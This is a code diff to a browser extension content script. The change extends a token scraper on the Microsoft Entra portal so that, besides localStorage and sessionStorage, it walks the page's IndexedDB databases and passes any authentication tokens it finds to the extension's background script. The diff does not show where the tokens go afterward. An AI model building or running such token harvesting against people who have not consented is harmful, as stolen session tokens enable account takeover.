@@ -4,32 +4,48 @@
   const MAX_TOKENS = 20;
   const MAX_JSON_DEPTH = 5;
   const MAX_ATTEMPTS = 45;
+  const MAX_INDEXED_DB_DATABASES = 12;
+  const MAX_INDEXED_DB_STORES = 40;
+  const MAX_INDEXED_DB_RECORDS_PER_STORE = 100;
   let attempts = 0;
+  let isScanning = false;
 
-  function scan() {
-    attempts += 1;
-    const tokens = collectPortalTokens();
-    if (tokens.length) {
-      chrome.runtime.sendMessage(
-        {
-          action: "capturePortalTokens",
-          tokens,
-          source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
-        },
-        () => {
-          void chrome.runtime.lastError;
-        }
-      );
+  async function scan() {
+    if (isScanning) {
+      return;
     }
-    if (attempts >= MAX_ATTEMPTS) {
-      clearInterval(interval);
+    isScanning = true;
+    attempts += 1;
+    try {
+      const includeIndexedDb = attempts <= 3 || attempts % 5 === 0;
+      const tokens = await collectPortalTokens(includeIndexedDb);
+      if (tokens.length) {
+        chrome.runtime.sendMessage(
+          {
+            action: "capturePortalTokens",
+            tokens,
+            source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
+          },
+          () => {
+            void chrome.runtime.lastError;
+          }
+        );
+      }
+    } finally {
+      isScanning = false;
+      if (attempts >= MAX_ATTEMPTS) {
+        clearInterval(interval);
+      }
     }
   }
 
-  function collectPortalTokens() {
+  async function collectPortalTokens(includeIndexedDb) {
     const tokens = new Set();
     collectStorageTokens(window.localStorage, tokens);
     collectStorageTokens(window.sessionStorage, tokens);
+    if (includeIndexedDb) {
+      await collectIndexedDbTokens(tokens);
+    }
     return [...tokens].slice(0, MAX_TOKENS);
   }
 
@@ -43,6 +59,116 @@
     } catch {
       // Some portal frames may deny storage access. The next scan can still succeed from another frame.
     }
+  }
+
+  async function collectIndexedDbTokens(tokens) {
+    if (
+      tokens.size >= MAX_TOKENS ||
+      !window.indexedDB ||
+      typeof window.indexedDB.databases !== "function"
+    ) {
+      return;
+    }
+
+    let databases;
+    try {
+      databases = await window.indexedDB.databases();
+    } catch {
+      return;
+    }
+
+    for (const databaseInfo of databases.slice(0, MAX_INDEXED_DB_DATABASES)) {
+      const databaseName = databaseInfo && databaseInfo.name;
+      if (!databaseName || tokens.size >= MAX_TOKENS) {
+        continue;
+      }
+
+      const database = await openDatabase(databaseName);
+      if (!database) {
+        continue;
+      }
+
+      try {
+        const storeNames = Array.from(database.objectStoreNames).slice(0, MAX_INDEXED_DB_STORES);
+        for (const storeName of storeNames) {
+          if (tokens.size >= MAX_TOKENS) {
+            break;
+          }
+          await collectObjectStoreTokens(database, storeName, tokens);
+        }
+      } finally {
+        database.close();
+      }
+    }
+  }
+
+  function openDatabase(databaseName) {
+    return new Promise((resolve) => {
+      try {
+        const request = window.indexedDB.open(databaseName);
+        request.onerror = () => resolve(undefined);
+        request.onblocked = () => resolve(undefined);
+        request.onsuccess = () => resolve(request.result);
+      } catch {
+        resolve(undefined);
+      }
+    });
+  }
+
+  function collectObjectStoreTokens(database, storeName, tokens) {
+    return new Promise((resolve) => {
+      let finished = false;
+      let recordsRead = 0;
+
+      function finish() {
+        if (!finished) {
+          finished = true;
+          resolve();
+        }
+      }
+
+      try {
+        const transaction = database.transaction(storeName, "readonly");
+        const store = transaction.objectStore(storeName);
+        const request = store.openCursor();
+
+        request.onerror = finish;
+        transaction.onerror = finish;
+        transaction.onabort = finish;
+        transaction.oncomplete = finish;
+        request.onsuccess = () => {
+          if (finished) {
+            return;
+          }
+
+          if (tokens.size >= MAX_TOKENS || recordsRead >= MAX_INDEXED_DB_RECORDS_PER_STORE) {
+            try {
+              transaction.abort();
+            } catch {
+              // The transaction may have already completed.
+            }
+            finish();
+            return;
+          }
+
+          const cursor = request.result;
+          if (!cursor) {
+            finish();
+            return;
+          }
+
+          recordsRead += 1;
+          addTokensFromValue(cursor.value, tokens);
+          try {
+            cursor.continue();
+          } catch {
+            finish();
+          }
+        };
+      } catch {
+        finish();
+      }
+    });
   }
 
   function addTokensFromValue(value, tokens, depth = 0) {
